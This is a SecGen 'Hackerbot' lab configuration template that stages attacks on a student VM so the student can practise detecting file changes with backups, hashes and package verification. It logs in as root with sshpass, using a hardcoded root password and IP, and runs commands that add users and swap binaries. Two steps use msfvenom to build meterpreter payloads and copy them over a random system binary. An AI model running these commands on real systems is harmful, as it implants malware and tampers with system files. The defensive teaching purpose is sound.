<%
  require 'json'
  require 'securerandom'
  require 'digest/sha1'
  require 'fileutils'
  require 'erb'

  if self.accounts.empty?
    abort('Sorry, you need to provide an account')
  end

  $first_account = JSON.parse(self.accounts.first)
  $second_account = JSON.parse(self.accounts[1])

  $files = []
  $log_files = []
  if $first_account.key?("leaked_filenames") &&  $first_account['leaked_filenames'].size > 0
    $files = $first_account['leaked_filenames']
    $log_files = $first_account['leaked_filenames'].grep(/log/)
  end

  if $files.empty?
    $files = ['myfile', 'afile', 'filee', 'thefile']
  end
  if $log_files.empty?
    $log_files = ['log', 'thelog', 'logs', 'frogonalog']
  end

  $main_user = $first_account['username'].to_s
  $second_user = $second_account['username'].to_s
  $example_file = "/home/#{$main_user}/#{$files.sample}"
  $example_dir = "/home/#{$main_user}/personal_secrets/"

  $root_password = self.root_password
  $flags = self.flags

  REQUIRED_FLAGS = 14
  while $flags.length < REQUIRED_FLAGS
    $flags << "flag{#{SecureRandom.hex}}"
    Print.err "Warning: Not enough flags provided to hackerbot_config generator, some flags won't be tracked/marked!"
  end

  def get_binding
    binding
  end
%>
<?xml version="1.0"?>

<hackerbot
               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xsi:schemaLocation="http://www.github/cliffe/SecGen/hackerbot">
<!--<hackerbot xmlns="http://www.github/cliffe/SecGen/hackerbotz"-->

	<name>Hackerbot</name>

	<AIML_chatbot_rules>config/AIML</AIML_chatbot_rules>

	<!--Method for gaining shell access, can be overwritten per-attack-->
	<!--<get_shell>bash</get_shell>-->
	<get_shell>sshpass -p <%= $root_password %> ssh -oStrictHostKeyChecking=no root@{{chat_ip_address}} /bin/bash</get_shell>

	<messages>
		<greeting>Your system is about to be hacked. I'll do what I can hold them off, but you are going to have to work with me to protect yourself. I'll cough up some flags if you work with me.</greeting>

		<!--Must provide alternatives for each message-->
		<say_ready>Let me know when you are 'ready', if you want to move on to another attack, say 'next', or 'previous' and I'll move things along.</say_ready>
		<say_ready>When you are ready, simply say 'ready'.</say_ready>
		<say_ready>'Ready'?</say_ready>
		<say_ready>Better hurry, the attack is imminent... Let me know when you're 'ready'.</say_ready>
		<next>Ok, I'll do what I can to move things along...</next>
		<next>Moving things along to the next attack...</next>
		<next>Ok, next attack...</next>
		<previous>Ok, I'll do what I can to back things up...</previous>
		<previous>Ok, previous attack...</previous>
		<previous>Ok, backing up.</previous>
		<goto>Ok, skipping it along.</goto>
		<goto>Let me see what I can do to goto that attack.</goto>
		<last_attack>That was the last attack for now. You can rest easy, until next time... (End.)</last_attack>
		<last_attack>That was the last attack. Game over?</last_attack>
		<first_attack>You are back to the beginning!</first_attack>
		<first_attack>This is where it all began.</first_attack>
		<getting_shell>Ok. Gaining shell access, and running post command...</getting_shell>
		<getting_shell>Hacking in progress...</getting_shell>
		<getting_shell>Attack underway...</getting_shell>
		<getting_shell>Here we go...</getting_shell>
		<got_shell>We are in to your system.</got_shell>
		<got_shell>You are pwned.</got_shell>
		<got_shell>We have shell.</got_shell>
		<repeat>Let me know when you are 'ready', if you want to move on to another attack, say 'next', or 'previous' and I'll move things along.</repeat>
		<repeat>Say 'ready', 'next', or 'previous'.</repeat>

		<!--Single responses:-->
		<help>I am waiting for you to say 'ready', 'next', 'previous', 'list', 'goto *X*', or 'answer *X*'</help>
		<say_answer>Say "The answer is *X*".</say_answer>
		<no_quiz>There is no question to answer</no_quiz>
		<correct_answer>Correct</correct_answer>
		<incorrect_answer>Incorrect</incorrect_answer>
		<invalid>That's not possible.</invalid>
		<non_answer>Wouldn't you like to know.</non_answer>

		<!--can be overwritten per-attack-->
		<shell_fail_message>Oh no. Failed to get shell... You need to let us in.</shell_fail_message>
	</messages>

	<tutorial_info>
		<title>Integrity Management: Detecting Change</title>
		<tutorial><%= ERB.new(File.read self.templates_path + 'intro.md.erb').result(self.get_binding) %></tutorial>
		<footer><%= File.read self.templates_path + 'integrity_limitations.md.erb' %>

<%= File.read self.templates_path + 'resources.md.erb' %>

<%= File.read self.templates_path + 'license.md.erb' %>

Randomised instance generated by [SecGen](http://github.com/cliffe/SecGen) (<%= Time.new.to_s %>)
		</footer>

		<provide_tutorial>true</provide_tutorial>

	</tutorial_info>

	<attack>
<% $random_user = 'user' + SecureRandom.hex(3) -%>
		<!-- topic: Detecting changes to resources using backups-->
		<prompt>An attempt to add a new user is coming, let it happen. But first create a backup of /etc/passwd to /home/<%= $main_user %>/backups/passwd.</prompt>

		<post_command>rm /etc/.pwd.lock; sudo adduser <%= $random_user %> --gecos '<%= $random_user %>' --disabled-password --quiet; echo $?</post_command>
		<suppress_command_output_feedback />
		<condition>
			<output_matches>returned error code</output_matches>
			<message>:( Couldn't add a user -- make sure /etc/ is not still read-only mounted!.</message>
		</condition>
		<condition>
			<output_matches>0</output_matches>
			<message>User added</message>
			<!--<trigger_next_attack>true</trigger_next_attack>-->
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>already exists</output_matches>
			<message>:( Remove the user and try again.</message>
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes...</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<quiz>
			<question>Now after the attack, find the username added by diffing using a backup. What username was created?</question>
			<answer>^<%= $random_user %>$</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	<tutorial>
<%= File.read self.templates_path + 'detect_changes.md.erb' %>

<%= ERB.new(File.read self.templates_path + 'detect_changes_backups.md.erb').result(self.get_binding) %>
	</tutorial>
	</attack>

	<attack>
		<!-- topic: Detecting changes to resources using backups-->
		<prompt>An attempt to edit a config file is coming, let it happen. But first make sure you have a backup of the /etc/ directory at /home/<%= $main_user %>/backups/etc/.</prompt>
		<post_command>changedf=`find /etc/ -name '*.sh' | sort -R | head -n 1`; echo '# <%= $flags.pop %>' >> $changedf; echo $changedf</post_command>
		<suppress_command_output_feedback />
		<condition>
			<output_matches>/etc/</output_matches>
			<message>A flag has been inserted into a random file in /etc/. Find the flag. Get to work!</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We are trying to write to /etc/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /etc/</message>
		</else_condition>

		<quiz>
			<question>Find the flag in your backups. For a second flag, what file was the flag stored in?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>


	<attack>
		<!-- topic: Detecting changes to resources using backups-->
		<prompt>An attempt to edit a config file is coming, let it happen. But first make sure you have a backup of the /etc/ directory at /home/<%= $main_user %>/backups/etc/.</prompt>
		<post_command>changedf=`find /home/<%= $main_user %>/backups/etc/ -name '*.sh' | sort -R | head -n 1`; echo '# <%= $flags.pop %>' >> $changedf; echo $changedf</post_command>
		<suppress_command_output_feedback />
		<condition>
			<output_matches>/home/<%= $main_user %>/backups/</output_matches>
			<message>A flag has been inserted into a random file IN YOUR BACKUPS! (Did you really think that was a safe place to store them?) Find the flag. Get to work!</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We are trying to write to /home/<%= $main_user %>/backups/etc/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /home/<%= $main_user %>/backups/etc/</message>
		</else_condition>

		<quiz>
			<question>Find the flag in your backups. For a second flag, what file was the flag stored in?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<attack>
<% $random = SecureRandom.hex -%>
		<!-- topic: File integrity checkers-->
		<prompt>Creating a new file in /home/<%= $main_user %>/... Let it happen.</prompt>

		<post_command>echo '<%= $random %>' > /home/<%= $main_user %>/something_secret; echo $?</post_command>
		<condition>
			<output_matches>0</output_matches>
			<message>Created /home/<%= $main_user %>/something_secret</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes...</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<quiz>
			<question>What is the SHA1 hash of /home/<%= $main_user %>/something_secret?</question>
			<answer>^<%= Digest::SHA1.hexdigest ("#{$random + "\n"}") %>$</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
		<tutorial><%= ERB.new(File.read self.templates_path + 'fim.md.erb').result(self.get_binding) %></tutorial>
	</attack>

	<attack>
		<!-- topic: File integrity checkers-->
		<prompt>Going to edit one of your files in /etc/. First, create hashes of /etc/. You will use hash comparisons to detect which file changes</prompt>
		<post_command>x=`find /etc/ -name '*.sh' | sort -R | head -n 1`; echo '' >> $x; echo $x</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/etc.*</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes...</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<quiz>
			<question>What is the file that changed? Use hash comparisons.</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
		<tutorial><%= ERB.new(File.read self.templates_path + 'fim_recursive.md.erb').result(self.get_binding) %></tutorial>
	</attack>

	<attack>
		<!-- topic: File integrity checkers-->
		<prompt>Going to create a new file in /etc/, use hash comparisons to detect which new file changes.</prompt>
		<post_command>x=`find /etc/ -type d | sort -R | head -n 1`; mktemp -p $x -t "XXXXXXXX"</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/etc.*</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<!--TODO could further randomise outcomes-->
	<attack>
		<!-- topic: File integrity checkers-->
		<prompt>Going to copy a new random binary in /bin/|/usr/bin/ use hash comparisons to find the filename of the copied file.</prompt>
		<post_command>srcf=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; srcf="${srcf%\\n}"; dest=$srcf.$RANDOM; cp $srcf $dest; echo $dest</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/bin/</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes...</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<!--TODO could further randomise outcomes-->
	<attack>
		<!-- topic: File integrity checkers-->
		<prompt>Going to move random binaries in /bin/|/usr/bin/ use hash comparisons to find the filenames.</prompt>
		<post_command>mv1=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; mv2=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; mv $mv1 $mv1.tmp; mv $mv2 $mv1; mv $mv1.tmp $mv2; echo "$mv1 $mv2|$mv2 $mv1"</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/bin/</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes...</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... </message>
		</else_condition>

		<quiz>
			<question>What were the two files that were created? Write the two full paths separated by a space.</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<!--copied a new random file in /etc/ use hash comparisons to find the filename. -->
	<!--TODO test this-->
	<attack>
		<!-- topic: File integrity checkers-->
		<prompt>Going to copy a new random file in /etc/ use hash comparisons to find the filename.</prompt>
		<post_command>srcf=`find /etc/ -type f | sort -R | head -n 1`; srcf="${srcf%\\n}"; dest=$srcf.$RANDOM; cp $srcf $dest; echo $dest</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/etc.*</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... </message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

<!--TODO: still needs testing, command works at commandline, but hackerbot seems to fail to work with this-->
	<!--trojanising a file in /usr/bin/, use package verification to detect which file changes-->
	<attack>
		<!-- topic: File integrity checkers-->
		<pre_shell>binname=$(sshpass -p DPZ0JJYRN3xJPy5mXwa7 ssh -oStrictHostKeyChecking=no root@10.247.40.2 'find /bin/ /usr/bin/ -executable | sort -R | head -n 1'); echo $binname; msfvenom --platform linux -p linux/x86/meterpreter/bind_tcp -f elf -o /tmp/msfout; sshpass -p DPZ0JJYRN3xJPy5mXwa7 scp -prv -oStrictHostKeyChecking=no /tmp/msfout root@10.247.40.2:$binname</pre_shell>
		<get_shell>false</get_shell>

		<prompt>Going to replace a binary file in /bin/ or /usr/bin/ with malware. Use PACKAGE VERIFICATION to detect which file has changed</prompt>

		<condition>
			<output_matches>/bin/</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes.../</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{pre_shell_command_output_first_line}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
		<tutorial><%= File.read self.templates_path + 'fim_package_management.md.erb' %></tutorial>
	</attack>

<!--TODO: still needs testing, command works at commandline, but hackerbot seems to fail to work with this-->
	<!--basically the same as above, but not specifying method to use-->
	<attack>
		<!-- topic: File integrity checkers-->
		<pre_shell>binname=$(sshpass -p DPZ0JJYRN3xJPy5mXwa7 ssh -oStrictHostKeyChecking=no root@10.247.40.2 'find /bin/ /usr/bin/ -executable | sort -R | head -n 1'); echo $binname; msfvenom --platform linux -p linux/x86/meterpreter/reverse_tcp -f elf -o /tmp/msfout; sshpass -p DPZ0JJYRN3xJPy5mXwa7 scp -prv -oStrictHostKeyChecking=no /tmp/msfout root@10.247.40.2:$binname</pre_shell>
		<get_shell>false</get_shell>

		<prompt>Going to replace a binary file in /bin/ or /usr/bin/ with malware. Detect which file has changed</prompt>

		<condition>
			<output_matches>/bin/</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes.../</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{pre_shell_command_output_first_line}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<attack>
		<prompt>Finally, try to prevent me from obtaining shell access to your system</prompt>
		<shell_fail_message>:) Failed to get shell... <%= $flags.pop %></shell_fail_message>
	</attack>

</hackerbot>
